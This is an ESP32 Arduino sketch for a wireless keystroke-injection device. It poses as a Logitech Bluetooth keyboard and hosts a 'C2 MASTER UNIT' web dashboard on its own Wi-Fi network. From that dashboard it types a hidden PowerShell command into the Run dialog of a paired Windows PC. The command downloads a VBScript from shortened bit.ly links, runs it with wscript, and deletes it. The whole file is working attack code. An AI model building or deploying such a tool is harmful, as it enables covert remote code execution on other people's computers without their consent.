#include <WiFi.h>
#include <WebServer.h>
#include <BleKeyboard.h>

// Initialize BLE Keyboard with your preferred identity
BleKeyboard bleKeyboard("C2-Master", "Logitech", 100);
WebServer server(80);

// Your Bitly/Gist links pointing to RAW VBScripts
const char* GIST_1 = "https://bit.ly/49WIDun";
const char* GIST_2 = "https://bit.ly/4qjbzBn";

// Optimized typing for high-performance laptop buffers
void typeSafe(String text) {
  for(int i=0; i < text.length(); i++) {
    bleKeyboard.press(text[i]); 
    delay(35); // Stable down-press
    bleKeyboard.releaseAll(); 
    delay(65); // Stable up-release
  }
}

void runPayload(String url) {
  bleKeyboard.press(KEY_LEFT_GUI); 
  bleKeyboard.press('r'); 
  delay(500); 
  bleKeyboard.releaseAll();
  delay(1200);

  // Use $env:TEMP to avoid the 'Access Denied' error
  String loader = "powershell -w n -c \"iwr '" + url + "' -outf $env:TEMP\\v.vbs; wscript $env:TEMP\\v.vbs; Start-Sleep -s 3; del $env:TEMP\\v.vbs\"";
  
  typeSafe(loader);
  bleKeyboard.write(KEY_RETURN);
}

void setup() {
  Serial.begin(115200);
  
  // Create your private C2 Network
  WiFi.softAP("C2-Panel-Kunal", "kunal123");
  
  // Dashboard UI with Cyberpunk aesthetic
  server.on("/", []() {
    String html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
    html += "<style>body{background:#0d0f12;color:#22d3ee;text-align:center;font-family:monospace;padding:20px;}";
    html += ".btn{width:90%;padding:25px;margin:15px;background:#1a1d24;border:2px solid #22d3ee;color:#22d3ee;font-weight:bold;cursor:pointer;border-radius:10px;}";
    html += ".btn:active{background:#22d3ee;color:#0d0f12;}</style></head><body>";
    html += "<h1>💀 C2 MASTER UNIT</h1>";
    html += "<button class='btn' onclick='fetch(\"/run1\")'>LAUNCH AUDIT</button>";
    html += "<button class='btn' onclick='fetch(\"/run2\")'>LAUNCH POPUP TEST</button>";
    html += "</body></html>";
    server.send(200, "text/html", html);
  });

  // Handle Web Requests
  server.on("/run1", []() { runPayload(GIST_1); server.send(200, "text/plain", "Fired Audit"); });
  server.on("/run2", []() { runPayload(GIST_2); server.send(200, "text/plain", "Fired Popup"); });

  server.begin();
  bleKeyboard.begin();
}

void loop() {
  server.handleClient();
}